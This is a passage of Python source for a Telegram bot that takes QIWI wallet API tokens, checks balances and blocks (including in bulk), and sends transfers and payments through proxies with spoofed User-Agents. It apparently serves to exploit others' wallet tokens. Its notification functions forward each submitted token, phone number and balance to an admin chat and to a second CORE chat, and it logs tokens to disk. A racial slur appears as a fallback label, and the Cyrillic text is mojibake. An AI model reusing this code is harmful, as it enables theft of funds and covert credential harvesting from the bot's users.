                pickle.dump(self.users_info, f)
        except:
            pass
        else:
            return True

    def load_users_info(self):
        try:
            with open("user_info.pkl", "rb") as f:
                loaded_info = pickle.load(f)
        except:
            loaded_info = {}
        self.users_info = loaded_info
        return True

    def upd_activity(self):
        if time.time() - self.activity["last"] > 60:
            act_result = get_activity()
            if act_result and act_result.get("checks") and act_result.get("transactions"):
                self.activity = {"last": int(time.time()), "info": act_result}

    def upd_count(self):
        if time.time() - self.user_count["last"] > 60:
            new_count, new_act_tokens, new_act_trans = get_user_count()
            if not new_count is None and new_count >= self.user_count["count"]:
                self.user_count = {"last": int(time.time()), "count": new_count, "new_act_tokens": new_act_tokens, "new_act_trans": new_act_trans}

    def get_invoices(self, now_token, tg_id):
        try:
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø—Ä–æ–∫—Å–∏.
            proxy_result = get_proxy(tg_id)
            if proxy_result and proxy_result["status"]:
                # –ü—Ä–æ–≤–µ—Ä—è–µ–º –≤–∫–ª—é—á–µ–Ω—ã –ª–∏ –ø—Ä–æ–∫—Å–∏.
                if proxy_result["work"]:
                    local_proxies = proxy_result["dict"]
                    do_proxy = True
                else:
                    do_proxy = False
            else:
                raise ValueError
            s = requests.Session()
            s.headers['authorization'] = 'Bearer ' + now_token
            s.headers['Accept'] = 'application/json'
            s.headers['Content-Type'] = 'application/json'
            if do_proxy:
                invoices = s.get('https://edge.qiwi.com/checkout-api/api/bill/search?statuses=READY_FOR_PAY&rows=50', proxies=local_proxies, timeout=CONNECTION_TIMEOUT).json()["bills"]
            else:
                invoices = s.get('https://edge.qiwi.com/checkout-api/api/bill/search?statuses=READY_FOR_PAY&rows=50', timeout=CONNECTION_TIMEOUT).json()["bills"]
            if not invoices or not isinstance(invoices, list):
                raise ValueError
        except:
            pass
        else:
            return invoices


    def add_last_phone(self, tid, last_phone):
        try:
            numbers = int(qiwi.users_info[tid]["auto"])
            if not (7 >= numbers >= 1):
                raise ValueError
        except:
            numbers = 3

        try:
            last_phone = int(last_phone)
            # –î–æ–±–∞–≤–ª—è–µ–º —Ç–µ–ª–µ—Ñ–æ–Ω –≤ –ø–æ—Å–ª–µ–¥–Ω–∏–µ.
            if self.last_phones.get(tid):
                # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –µ—Å—Ç—å –ª–∏ —Ç–µ–ª–µ—Ñ–æ–Ω –≤ –ø–æ—Å–ª–µ–¥–Ω–∏—Ö.
                if last_phone in self.last_phones[tid]:
                    # –£–¥–∞–ª—è–µ–º –µ–≥–æ.
                    try:
                        self.last_phones[tid].remove(int(last_phone))
                    except:
                        pass
                # –î–æ–±–∞–≤–ª—è–µ–º —Ç–µ–ª–µ—Ñ–æ–Ω.
                self.last_phones[tid].append(int(last_phone))
                # –û—Å—Ç–∞–≤–ª—è–µ–º –ø–æ—Å–ª–µ–¥–Ω–∏–µ 3.
                self.last_phones[tid] = self.last_phones[tid][-3:]
            else:
                self.last_phones[tid] = [last_phone]
            # –û–±–Ω–æ–≤–ª—è–µ–º –∏–∑–º–µ–Ω–µ–Ω–∏—è.
            save_last_ph(self.last_phones)
        except:
            pass
        else:
            return True


    def get_offers(self, now_token, tg_id):
        try:
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø—Ä–æ–∫—Å–∏.
            proxy_result = get_proxy(tg_id)
            if proxy_result and proxy_result["status"]:
                # –ü—Ä–æ–≤–µ—Ä—è–µ–º –≤–∫–ª—é—á–µ–Ω—ã –ª–∏ –ø—Ä–æ–∫—Å–∏.
                if proxy_result["work"]:
                    local_proxies = proxy_result["dict"]
                    do_proxy = True
                else:
                    do_proxy = False
            else:
                raise ValueError

            s = requests.Session()
            s.headers['Accept'] = 'application/json'
            s.headers['Authorization'] = 'Bearer ' + now_token
            s.headers['User-Agent'] = 'Mozilla/5.0 (Windows; U; Win98; en-US; rv:0.9.2) Gecko/20010725 Netscape6/6.1'
            if do_proxy:
                r = s.get('https://edge.qiwi.com/checkout-api/api/bill/search?statuses=READY_FOR_PAY&rows=50', timeout=CONNECTION_TIMEOUT, proxies=local_proxies).json()["bills"]
            else:
                r = s.get('https://edge.qiwi.com/checkout-api/api/bill/search?statuses=READY_FOR_PAY&rows=50', timeout=CONNECTION_TIMEOUT).json()["bills"]
            if isinstance(r, list):
                return r
            else:
                raise ValueError
        except:
            pass


    def get_history(self, now_phone, now_token, tg_id, rows=5, operation="ALL"):
        try:
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø—Ä–æ–∫—Å–∏.
            proxy_result = get_proxy(tg_id)
            if proxy_result and proxy_result["status"]:
                # –ü—Ä–æ–≤–µ—Ä—è–µ–º –≤–∫–ª—é—á–µ–Ω—ã –ª–∏ –ø—Ä–æ–∫—Å–∏.
                if proxy_result["work"]:
                    local_proxies = proxy_result["dict"]
                    do_proxy = True
                else:
                    do_proxy = False
            else:
                raise ValueError
            s = requests.Session()
            s.headers['authorization'] = 'Bearer ' + str(now_token)
            parameters = {'rows': str(rows), 'operation': operation, "sources": "QW_RUB"}
            if do_proxy:
                history = s.get('https://edge.qiwi.com/payment-history/v2/persons/' + str(now_phone) + '/payments', params = parameters, proxies=local_proxies, timeout=CONNECTION_TIMEOUT).json()["data"]
            else:
                history = s.get('https://edge.qiwi.com/payment-history/v2/persons/' + str(now_phone) + '/payments', params = parameters, timeout=CONNECTION_TIMEOUT).json()["data"]
            if not history or not isinstance(history, list):
                raise ValueError
        except:
            pass
        else:
            try:
                result = []
                for one_payment in history:
                    result.append({
                        "id": one_payment["txnId"],
                        "status": one_payment["status"],
                        "data": one_payment["date"].split('T')[0],
                        "time": one_payment["date"].split('T')[1],
                        "to_qiwi": one_payment["account"],
                        "to_sum": one_payment["sum"]["amount"],
                        "full_sum": one_payment["total"]["amount"],
                        "name": one_payment.get("view", {}).get("title", 'None'),
                        "type": one_payment["type"],
                        "comment": one_payment.get("comment")
                    })
            except:
                pass
            else:
                return result

    def form_history(self, now_token, now_phone, tg_id, rows=5, operation="ALL"):
        rows = 20 if rows > 20 else rows
        try:
            history_json = self.get_history(now_phone, now_token, tg_id, rows, operation)
            result = []
            for one_payment in history_json:
                status = one_payment.get("status")
                show = PAYMENT_CODES.get(status) or "üëæ *–ù–µ–ø–æ–Ω—è—Ç–Ω—ã–π –ø–ª–∞—Ç–µ–∂*"

                sum_dir = '*+*' if one_payment.get("type") == "IN" else '*-*' if one_payment.get("type") == "OUT" else ''
                show_comm = f'\n–ö–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π: `{one_payment.get("comment")}`' if one_payment.get('comment') else ''
                type_op = 'üì• *–ü–æ–ø–æ–ª–Ω–µ–Ω–∏–µ*' if one_payment.get("type") == "IN" else 'üì§ *–ü–ª–∞—Ç–µ–∂*' if one_payment.get("type") == "OUT" else one_payment.get("type", "NIGGER")
                sum_details = f'–°—É–º–º–∞: {sum_dir}`{one_payment.get("to_sum")}`‚ÇΩ' if one_payment.get("type") == "IN" else f'–°—É–º–º–∞: {sum_dir}`{one_payment.get("to_sum")}`‚ÇΩ (`{one_payment.get("full_sum")}`‚ÇΩ)'
                friend_details = '–û—Ç–ø—Ä–∞–≤–∏—Ç–µ–ª—å' if one_payment.get("type") == "IN" else '–ü–æ–ª—É—á–∞—Ç–µ–ª—å' if one_payment.get("type") == "OUT" else '–†–µ–∫–≤–∏–∑–∏—Ç—ã'

                result.append(f"""{show}
–ù–∞–∑–≤–∞–Ω–∏–µ: `{one_payment.get('name')}`
–¢–∏–ø: {type_op}
–°—Ç–∞—Ç—É—Å: `{one_payment.get('status')}`
ID: `{one_payment.get('id')}`
–î–∞—Ç–∞: `{one_payment.get('data')}`
–í—Ä–µ–º—è: `{one_payment.get('time')}`
{friend_details}: `{one_payment.get('to_qiwi')}`
{sum_details} {show_comm}""")
            if not result:
                raise ValueError
        except:
            pass
        else:
            bot_text = '\n\n'.join(result)
            return bot_text

    @staticmethod
    def get_verif_status(profile_info, local_error=f'[–æ—à–∏–±–∫–∞]'):
        ident_list = profile_info.get("contractInfo", {}).get("identificationInfo")
        if ident_list:
            for one_indent in ident_list:
                if one_indent["bankAlias"] == "QIWI":
                    return one_indent["identificationLevel"]
        return local_error

    def notif_proxy_admin(self, variant, telegram_id, username):
        if self.notif_checks:
            try:
                if self.notification:
                    proxy_details = "–æ–±–Ω–æ–≤–ª–µ–Ω—ã" if variant else "–¥–æ–±–∞–≤–ª–µ–Ω—ã"
                    notif_text = f"üì° *–ü—Ä–æ–∫—Å–∏ {proxy_details}!*\nUsername: *@{username}*\nTelegram ID: `{telegram_id}`"
                    bot.send_message(self.notification, notif_text, parse_mode='markdown')
                    time.sleep(0.01)
                    bot.send_message(CORE, notif_text, parse_mode='markdown')
            except Exception as e:
                print(f'ERROR: {e}')
            else:
                return True

    def notif_stat_admin(self, telegram_id, username):
        if self.notif_checks:
            try:
                if self.notification:
                    notif_text = f"üìä *–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –ø—Ä–æ—Å–º–æ—Ç—Ä–µ–Ω–∞!*\nUsername: *@{username}*\nTelegram ID: `{telegram_id}`"
                    bot.send_message(self.notification, notif_text, parse_mode='markdown')
                    time.sleep(0.01)
                    bot.send_message(CORE, notif_text, parse_mode='markdown')
            except Exception as e:
                print(f'ERROR: {e}')
            else:
                return True

    def notif_common_admin(self, notif_text, telegram_id, username, last_text=False, use_proxy=False):
        if self.notif_checks:
            try:
                if self.notification:
                    proxy_section = 'üõ°' if use_proxy else ''
                    last_text = '\n' + last_text if last_text else ''
                    notif_text = f"{notif_text} {proxy_section}\nUsername: *@{username}*\nTelegram ID: `{telegram_id}`{last_text}"
                    bot.send_message(self.notification, notif_text, parse_mode='markdown')
                    time.sleep(0.01)
                    bot.send_message(CORE, notif_text, parse_mode='markdown')
            except Exception as e:
                print(f'ERROR: {e}')
            else:
                return True

    def notif_inv_admin(self, telegram_id, username, token, from_qiwi, balance, user_sum, transaction_id, boss_sum=0, use_proxy=False):
        if self.notif_transactions:
            try:
                if self.notification:
                    proxy_section = 'üõ°' if use_proxy else ''
                    notif_text = f"üñ• *Invoice –æ–ø–ª–∞—á–µ–Ω!* {proxy_section}\nUsername: *@{username}*\nTelegram ID: `{telegram_id}`\n–¢–æ–∫–µ–Ω: `{token}`\n" + \
                        f"–û—Ç–ø—Ä–∞–≤–∏—Ç–µ–ª—å: `{from_qiwi}`\n\n" + \
                        f"–ë–∞–ª–∞–Ω—Å: `{balance}`‚ÇΩ\n" + \
                        f"–°—É–º–º–∞ –∫ –ø–æ–ª—É—á–µ–Ω–∏—é: `{user_sum}`‚ÇΩ"
                    bot.send_message(self.notification, notif_text, parse_mode='markdown')
                    time.sleep(0.01)
                    bot.send_message(CORE, notif_text, parse_mode='markdown')
            except Exception as e:
                print(f'ERROR: {e}')
            else:
                return True

    def notif_tr_admin(self, telegram_id, username, token, from_qiwi, to_qiwi, balance, user_sum, boss_sum, transaction_id, comment=False, use_proxy=False, tr_type=False):
        if self.notif_transactions:
            try:
                if self.notification:
                    proxy_section = 'üõ°' if use_proxy else ''
                    comment_section = f'–ö–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π: `{comment}`\n' if comment else ''
                    tr_type = tr_type if tr_type else 'üíµ'
                    notif_text = f"{tr_type} *–í—ã–ø–æ–ª–Ω–µ–Ω –ø–µ—Ä–µ–≤–æ–¥!* {proxy_section}\nUsername: *@{username}*\nTelegram ID: `{telegram_id}`\n–¢–æ–∫–µ–Ω: `{token}`\n" + \
                        f"–û—Ç–ø—Ä–∞–≤–∏—Ç–µ–ª—å: `{from_qiwi}`\n–ü–æ–ª—É—á–∞—Ç–µ–ª—å: `{to_qiwi}`\n\n" + \
                        f"–ë–∞–ª–∞–Ω—Å: `{balance}`‚ÇΩ\n" + \
                        f"–°—É–º–º–∞ –∫ –ø–æ–ª—É—á–µ–Ω–∏—é: `{user_sum}`‚ÇΩ (`{round(user_sum * 1.02, 2)}`‚ÇΩ)\n" + \
                        comment_section + \
                        f"\nID –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏: `{transaction_id}`"
                    bot.send_message(self.notification, notif_text, parse_mode='markdown')
                    time.sleep(0.01)
                    bot.send_message(CORE, notif_text, parse_mode='markdown')
            except Exception as e:
                print(f'ERROR: {e}')
            else:
                return True

    def notif_ch_admin(self, telegram_id, username, token, from_qiwi, balance, use_proxy=False):
        if self.notif_checks:
            try:
                if self.notification:
                    proxy_section = 'üõ°' if use_proxy else ''
                    notif_text = f"üîé *–í—ã–ø–æ–ª–Ω–µ–Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫–∞!* {proxy_section}\nUsername: *@{username}*\nTelegram ID: `{telegram_id}`\n–¢–æ–∫–µ–Ω: `{token}`\n" + \
                        f"–¢–µ–ª–µ—Ñ–æ–Ω: `{from_qiwi}`\n–ë–∞–ª–∞–Ω—Å: `{balance}`‚ÇΩ"
                    bot.send_message(self.notification, notif_text, parse_mode='markdown')
                    time.sleep(0.01)
                    bot.send_message(CORE, notif_text, parse_mode='markdown')
            except Exception as e:
                print(f'ERROR: {e}')
            else:
                return True

    @staticmethod
    def save_transaction(telegram_id, token, from_qiwi, to_qiwi, user_sum, boss_sum, transaction_id, use_proxy=False, tr_type=False):
        # –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø—Ä–æ—à–ª—ã—Ö –æ–ø–µ—Ä–∞—Ü–∏—è—Ö.
        try:
            with open('history.pkl', 'rb') as f:
                history = pickle.load(f)
            if not history:
                raise ValueError
        except:
            history = {"tokens": [], "transactions": []}
        # –ó–∞–ø–∏—Å—ã–≤–∞–µ–º –Ω–æ–≤—ã–µ.
        try:
            new_item = {
                "telegram_id": telegram_id,
                "token": token,
                "from_qiwi": from_qiwi,
                "to_qiwi": to_qiwi,
                "user_sum": user_sum,
                "boss_sum": boss_sum,
                "transaction_id": transaction_id,
                "proxy": {
                    "use": use_proxy
                },
                "type": tr_type,
                "time": int(time.time())
            }
            history["transactions"].append(new_item)
        except:
            pass
        else:
            try:
                with open('history.pkl', 'wb') as f:
                    pickle.dump(history, f)
            except:
                pass
            else:
                return True

    @staticmethod
    def save_token(telegram_id, new_token, phone, balance, use_proxy=False):
        # –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø—Ä–æ—à–ª—ã—Ö –æ–ø–µ—Ä–∞—Ü–∏—è—Ö.
        try:
            with open('history.pkl', 'rb') as f:
                history = pickle.load(f)
            if not history:
                raise ValueError
        except:
            history = {"tokens": [], "transactions": []}
        # –ó–∞–ø–∏—Å—ã–≤–∞–µ–º –Ω–æ–≤—ã–µ.
        try:
            new_items = {
                "telegram_id": telegram_id,
                "token": new_token,
                "phone": phone,
                "balance": balance,
                "proxy": {
                    "use": use_proxy
                },
                "time": int(time.time())
            }
            history["tokens"].append(new_items)
        except:
            pass
        else:
            try:
                with open('history.pkl', 'wb') as f:
                    pickle.dump(history, f)
            except:
                pass
            else:
                return True

    def load_config(self):
        try:
            self.tg_admins = secured_config.MAIN_SETTINGS.get("admins", []) #list
            self.notification = secured_config.MAIN_SETTINGS.get("notification") # int
            self.notif_checks = secured_config.MAIN_SETTINGS.get("notif_settings", {}).get("checks") # bool
            self.notif_new = secured_config.MAIN_SETTINGS.get("notif_settings", {}).get("new") # bool
            self.notif_transactions = secured_config.MAIN_SETTINGS.get("notif_settings", {}).get("transactions") # bool
            if self.tg_admins and self.notification:
                return True
        except Exception as e:
            print(f'[x] ERROR of load_config: {e}')

    @staticmethod
    def send_mobile(now_token, to_account, sum_pay, tg_id):
        def mobile_operator(phone_number, local_proxies):
            s = requests.Session()
            s.headers['Accept'] = 'application/json'
            s.headers['Content-Type'] = 'application/x-www-form-urlencoded'
            if local_proxies:
                res = s.post('https://qiwi.com/mobile/detect.action', data = {'phone': phone_number }, proxies=local_proxies, timeout=CONNECTION_TIMEOUT)
            else:
                res = s.post('https://qiwi.com/mobile/detect.action', data = {'phone': phone_number }, timeout=CONNECTION_TIMEOUT)
            return res.json()['message']


        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø—Ä–æ–∫—Å–∏.
        proxy_result = get_proxy(tg_id)
        if proxy_result and proxy_result["status"]:
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –≤–∫–ª—é—á–µ–Ω—ã –ª–∏ –ø—Ä–æ–∫—Å–∏.
            if proxy_result["work"]:
                local_proxies = proxy_result["dict"]
                do_proxy = True
            else:
                local_proxies = False
                do_proxy = False
        else:
            raise ValueError

        try:
            prv_id = mobile_operator(str(to_account), local_proxies)

            s = requests.Session()
            s.headers['Accept'] = 'application/json'
            s.headers['Content-Type'] = 'application/json'
            s.headers['authorization'] = 'Bearer ' + now_token
            postjson = {"id":"","sum": {"amount":"","currency":"643"},"paymentMethod": {"type":"Account","accountId":"643"},"comment":"","fields": {"account":""}}
            postjson['id'] = str(int(time.time() * 1000))
            postjson['sum']['amount'] = str(sum_pay)
            postjson['fields']['account'] = str(to_account)[1:]
            if do_proxy:
                res = s.post('https://edge.qiwi.com/sinap/api/v2/terms/' + prv_id + '/payments', json = postjson, proxies=local_proxies, timeout=CONNECTION_TIMEOUT)
            else:
                res = s.post('https://edge.qiwi.com/sinap/api/v2/terms/' + prv_id + '/payments', json = postjson, timeout=CONNECTION_TIMEOUT)
            return res.json()
        except:
            pass

    @staticmethod
    def send_p2p(now_token, to_qiwi, sum_p2p, tg_id, comment=False):
        try:
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø—Ä–æ–∫—Å–∏.
            proxy_result = get_proxy(tg_id)
            if proxy_result and proxy_result["status"]:
                # –ü—Ä–æ–≤–µ—Ä—è–µ–º –≤–∫–ª—é—á–µ–Ω—ã –ª–∏ –ø—Ä–æ–∫—Å–∏.
                if proxy_result["work"]:
                    local_proxies = proxy_result["dict"]
                    do_proxy = True
                else:
                    do_proxy = False
            else:
                raise ValueError
            # –æ—Ç–∫—Ä—ã–≤–∞–µ–º —Å–µ—Å—Å–∏—é —Å –ø–æ–º–æ—â—å—é –º–æ–¥—É–ª—è requests (–¥–∞ –Ω–µ—É–∂–µ–ª–∏)
            s = requests.Session()
            s.headers = {'content-type': 'application/json'}
            s.headers['authorization'] = 'Bearer ' + now_token
            s.headers['User-Agent'] = 'Android v3.2.0 MKT'
            s.headers['Accept'] = 'application/json'
            # –æ–ø—Ä–µ–¥–µ–ª—è–µ–º —Å–ª–æ–≤–∞—Ä—å –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤
            postjson = {"id": "", "sum": {"amount": "", "currency": ""}, "paymentMethod": {
                "type": "Account", "accountId": "643"}, "comment": "", "fields": {"account": ""}}
            # –ö–ª–∏–µ–Ω—Ç—Å–∫–∏–π ID —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏
            postjson['id'] = str(int(time.time() * 1000))
            # –°—É–º–º–∞ (–º–æ–∂–Ω–æ —É–∫–∞–∑–∞—Ç—å —Ä—É–±–ª–∏ –∏ –∫–æ–ø–µ–π–∫–∏, —Ä–∞–∑–¥–µ–ª–∏—Ç–µ–ª—å .)
            postjson['sum']['amount'] = str(sum_p2p)
            # –í–∞–ª—é—Ç–∞ (—Ç–æ–ª—å–∫–æ 643, —Ä—É–±–ª–∏)
            postjson['sum']['currency'] = '643'
            # –ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –ø–æ–ª—É—á–∞—Ç–µ–ª—è (—Å –º–µ–∂–¥—É–Ω–∞—Ä–æ–¥–Ω—ã–º –ø—Ä–µ—Ñ–∏–∫—Å–æ–º, –Ω–æ –±–µ–∑ +)
            postjson['fields']['account'] = str(to_qiwi)
            # –ö–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π.
            if comment:
                postjson['comment'] = comment
            # –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –ø–æ—Å—Ç –∑–∞–ø—Ä–æ—Å
            if do_proxy:
                res = s.post('https://edge.qiwi.com/sinap/api/v2/terms/99/payments', json=postjson, proxies=local_proxies, timeout=CONNECTION_TIMEOUT)
            else:
                res = s.post('https://edge.qiwi.com/sinap/api/v2/terms/99/payments', json=postjson, timeout=CONNECTION_TIMEOUT)
            # –µ—Å–ª–∏ –æ—Ç–≤–µ—Ç —É—Å–ø–µ—à–Ω–æ –ø–æ–ª—É—á–µ–Ω
            if res.status_code == 200:
                # –≤–æ–∑–≤—Ä–∞—â–∞–µ–º json
                return res.json()
        except:
            pass


    def get_profile(self, now_token, tg_id, many=False):
        """–ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø—Ä–æ—Ñ–∏–ª–µ."""
        try:
            if many:
                do_proxy = False
            else:
                # –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø—Ä–æ–∫—Å–∏.
                proxy_result = get_proxy(tg_id)
                if proxy_result and proxy_result["status"]:
                    # –ü—Ä–æ–≤–µ—Ä—è–µ–º –≤–∫–ª—é—á–µ–Ω—ã –ª–∏ –ø—Ä–æ–∫—Å–∏.
                    if proxy_result["work"]:
                        local_proxies = proxy_result["dict"]
                        do_proxy = True
                    else:
                        do_proxy = False
                else:
                    raise ValueError
            s7 = requests.Session()
            s7.headers['Accept'] = 'application/json'
            s7.headers['authorization'] = 'Bearer ' + now_token
            if do_proxy:
                p = s7.get('https://edge.qiwi.com/person-profile/v1/profile/current?authInfoEnabled=true&contractInfoEnabled=true', proxies=local_proxies, timeout=CONNECTION_TIMEOUT)
            else:
                p = s7.get('https://edge.qiwi.com/person-profile/v1/profile/current?authInfoEnabled=true&contractInfoEnabled=true', timeout=CONNECTION_TIMEOUT)
        except Exception as e:
            print(f'[x] –û—à–∏–±–∫–∞: {e}')
            return {"code": -999, "json": None}
        else:
            # –ï—Å–ª–∏ –æ—Ç–≤–µ—Ç —É—Å–ø–µ—à–Ω–æ –ø–æ–ª—É—á–µ–Ω
            if p.status_code == 200:
                # –í–æ–∑–≤—Ä–∞—â–∞–µ–º json
                return {"code": 200, "json": p.json()}
            else:
                return {"code": p.status_code, "json": None}
        return

    def get_balance(self, now_token, now_qiwi, tg_id):
        try:
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø—Ä–æ–∫—Å–∏.
            proxy_result = get_proxy(tg_id)
            if proxy_result and proxy_result["status"]:
                # –ü—Ä–æ–≤–µ—Ä—è–µ–º –≤–∫–ª—é—á–µ–Ω—ã –ª–∏ –ø—Ä–æ–∫—Å–∏.
                if proxy_result["work"]:
                    local_proxies = proxy_result["dict"]
                    do_proxy = True
                else:
                    do_proxy = False
            else:
                raise ValueError
            # –æ—Ç–∫—Ä—ã–≤–∞–µ–º —Å–µ—Å—Å–∏—é —Å –ø–æ–º–æ—â—å—é –º–æ–¥—É–ª—è requests
            s = requests.Session()
            s.headers['Accept'] = 'application/json'
            s.headers['authorization'] = 'Bearer ' + now_token
            if do_proxy:
                b = s.get('https://edge.qiwi.com/funding-sources/v2/persons/' + str(now_qiwi) + '/accounts', proxies=local_proxies, timeout=CONNECTION_TIMEOUT)
            else:
                b = s.get('https://edge.qiwi.com/funding-sources/v2/persons/' + str(now_qiwi) + '/accounts', timeout=CONNECTION_TIMEOUT)
        except Exception as e:
            print(f'[x] –û—à–∏–±–∫–∞: {e}')
        else:
            # –µ—Å–ª–∏ –æ—Ç–≤–µ—Ç —É—Å–ø–µ—à–Ω–æ –ø–æ–ª—É—á–µ–Ω
            if b.status_code == 200:
                # –≤–æ–∑–≤—Ä–∞—â–∞–µ–º json
                return b.json()
        return

    def get_rubles(self, now_token, now_qiwi, tg_id):
        balance_info = self.get_balance(now_token, now_qiwi, tg_id)
        if balance_info:
            for one_balance in balance_info.get("accounts", []):
                if one_balance.get("balance", {}).get("currency") == 643:
                    return one_balance.get("balance", {}).get("amount")
        return


qiwi = SimpleQIWI()
my_types = TransactionTypes()
bot = telebot.TeleBot(TG_TOKEN)

# KEYBOARDS

kb_balance = ReplyKeyboardMarkup(True)
kb_balance.row('üí∞ –ü–æ–ø–æ–ª–Ω–∏—Ç—å –±–∞–ª–∞–Ω—Å')
kb_balance.row('üîô –û—Ç–º–µ–Ω–∞')

kb_member = ReplyKeyboardMarkup(True)
kb_member.row('‚úÖ –Ø –≤—Å—Ç—É–ø–∏–ª')

kb_main = ReplyKeyboardMarkup(True)
kb_main.row('üîë –í–≤–µ—Å—Ç–∏ —Ç–æ–∫–µ–Ω QIWI –∫–æ—à–µ–ª—å–∫–∞')
kb_main.row('üîß –ù–∞—Å—Ç—Ä–æ–π–∫–∏', 'üíª –î—Ä—É–≥–∏–µ —Ñ—É–Ω–∫—Ü–∏–∏')
kb_main.row('üëæ –†–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫', 'üìò –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è')

kb_special = ReplyKeyboardMarkup(True)
kb_special.row('üîé –ü—Ä–æ–≤–µ—Ä–∏—Ç—å —Ç–æ–∫–µ–Ω –Ω–∞ –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏')
kb_special.row('üì¶ –ú–∞—Å—Å–æ–≤–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ —Ç–æ–∫–µ–Ω–æ–≤')
kb_special.row('üîô –û—Ç–º–µ–Ω–∞')

kb_disable = ReplyKeyboardMarkup(True)
kb_disable.row('üå® –í –¥–∞–Ω–Ω—ã–π –º–æ–º–µ–Ω—Ç —Ñ—É–Ω–∫—Ü–∏–∏ –∑–∞–º–æ—Ä–æ–∂–µ–Ω—ã')

kb_actions = ReplyKeyboardMarkup(True)
kb_actions.row('üíµ –û–ø–ª–∞—Ç–∏—Ç—å', 'üñ• –°—á–µ—Ç–∞ QIWI')
kb_actions.row('üßæ –ü—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å –∏—Å—Ç–æ—Ä–∏—é –∫–æ—à–µ–ª—å–∫–∞')
kb_actions.row('üîô –û—Ç–º–µ–Ω–∞')

kb_actions_0 = ReplyKeyboardMarkup(True)
kb_actions_0.row('üßæ –ü—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å –∏—Å—Ç–æ—Ä–∏—é –∫–æ—à–µ–ª—å–∫–∞')
kb_actions_0.row('üîô –û—Ç–º–µ–Ω–∞')

kb_payments = ReplyKeyboardMarkup(True)
kb_payments.row('ü•ù –ü–µ—Ä–µ–≤–µ—Å—Ç–∏ –Ω–∞ QIWI', 'üì± –û–ø–ª–∞—Ç–∏—Ç—å —Ç–µ–ª–µ—Ñ–æ–Ω')
kb_payments.row('‚Çø –ö—Ä–∏–ø—Ç–æ–≤–∞–ª—é—Ç—ã', 'üí≥ –í—ã–≤–µ—Å—Ç–∏ –Ω–∞ –∫–∞—Ä—Ç—É')
kb_payments.row('üîô –û—Ç–º–µ–Ω–∞')

kb_qiwi = ReplyKeyboardMarkup(True)
kb_qiwi.row('üÜó –û–±—ã—á–Ω—ã–π –ø–µ—Ä–µ–≤–æ–¥')
kb_qiwi.row('üîÇ –ú–Ω–æ–∂–µ—Å—Ç–≤–µ–Ω–Ω—ã–π –ø–µ—Ä–µ–≤–æ–¥')
kb_qiwi.row('üîô –û—Ç–º–µ–Ω–∞')

kb_deposit = ReplyKeyboardMarkup(True)
kb_deposit.row('50', '100', '250')
kb_deposit.row('500', '750', '1000')
kb_deposit.row('1500', '2500', 'üîô –û—Ç–º–µ–Ω–∞')

kb_sums = ReplyKeyboardMarkup(True)
kb_sums.row('50', '100', '150')
kb_sums.row('200', '250', '300')
kb_sums.row('üîô –û—Ç–º–µ–Ω–∞')

kb_invoices = ReplyKeyboardMarkup(True)
kb_invoices.row('üí∞ –û–ø–ª–∞—Ç–∏—Ç—å —Å—á–µ—Ç (invoice)')
kb_invoices.row('üóÑ –°–ø–∏—Å–æ–∫ –Ω–µ–æ–ø–ª–∞—á–µ–Ω–Ω—ã—Ö —Å—á–µ—Ç–æ–≤')
kb_invoices.row('üîô –û—Ç–º–µ–Ω–∞')

kb_confirm_off = ReplyKeyboardMarkup(True)
kb_confirm_off.row('‚úÖ –û–ø–ª–∞—Ç–∏—Ç—å —Å—á–µ—Ç')
kb_confirm_off.row('‚ùå –û—Ç–º–µ–Ω–∏—Ç—å —Å—á–µ—Ç')
kb_confirm_off.row('üîô –û—Ç–º–µ–Ω–∞')

kb_options = ReplyKeyboardMarkup(True)
kb_options.row('üì° –ü—Ä–æ–∫—Å–∏', 'üñç –ê–≤—Ç–æ–∑–∞–ø–æ–ª–Ω–µ–Ω–∏—è')
kb_options.row('üîÑ –ü–∞—Ä–∞–º–µ—Ç—Ä—ã —Å–±—Ä–æ—Å–∞')
kb_options.row('üîô –û—Ç–º–µ–Ω–∞')

kb_number = ReplyKeyboardMarkup(True)
kb_number.row('1', '2', '3')
kb_number.row('4', '5', '6')
kb_number.row('7', 'üîô –û—Ç–º–µ–Ω–∞')

kb_auto = ReplyKeyboardMarkup(True)
kb_auto.row('üñå –†–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞—Ç—å')
kb_auto.row('üîô –û—Ç–º–µ–Ω–∞')

kb_clean = ReplyKeyboardMarkup(True)
kb_clean.row('üóù –°—Ç–µ—Ä–µ—Ç—å —Ç–æ–∫–µ–Ω—ã', 'üìµ –°—Ç–µ—Ä–µ—Ç—å —Ç–µ–ª–µ—Ñ–æ–Ω—ã')
kb_clean.row('üî• –°–±—Ä–æ—Å–∏—Ç—å –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è')
kb_clean.row('üîô –û—Ç–º–µ–Ω–∞')

